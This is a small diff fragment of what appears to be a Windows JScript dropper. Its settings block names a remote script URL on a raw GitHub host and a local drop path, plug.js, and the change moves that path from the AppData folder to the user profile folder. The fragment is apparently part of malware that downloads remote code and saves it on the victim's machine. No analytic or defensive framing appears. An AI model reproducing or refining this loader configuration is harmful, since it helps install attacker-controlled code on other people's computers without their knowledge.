@@ -83,7 +83,7 @@ function main() {
 	 * Settings
 	 */
 	var dotnet = false;
-	var filename3 = environ('%AppData%\\plug.js');
+	var filename3 = environ('%UserProfile%\\plug.js');
 	var url3 = 'https://raw.githubusercontent.com/dashboard23/ffffff/main/task.js';
 	
 	
